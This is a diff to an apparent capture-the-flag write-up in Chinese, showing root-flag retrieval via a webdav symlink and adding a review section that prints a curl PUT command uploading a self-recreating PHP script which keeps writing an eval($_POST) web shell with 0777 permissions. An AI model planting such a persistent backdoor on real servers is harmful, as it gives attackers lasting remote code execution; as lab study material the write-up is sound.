@@ -67,3 +67,16 @@ cd /var/lib/webdav
 ln -s /root/root.txt test1
 dav:/> cat test1
 flag{root-ca3fca4032f5f3c5cba2a13b9ec459a5}
+
+## wp复盘
+大佬利用webdav put命令创建的持久化php后门
+```bash
+curl -X PUT http://dev.dav.dsz:6065/test \
+-u admin:qwertyuiop \
+--data '<?php
+ignore_user_abort(true);set_time_limit(0);$file="persist.php";
+$code="<?php @eval(\$_POST[\"pass\"]); ?>";while(true)
+{if(!file_exists($file))
+{file_put_contents($file,$code);}chmod($file,0777);usleep(1000
+0);} ?>'
+```
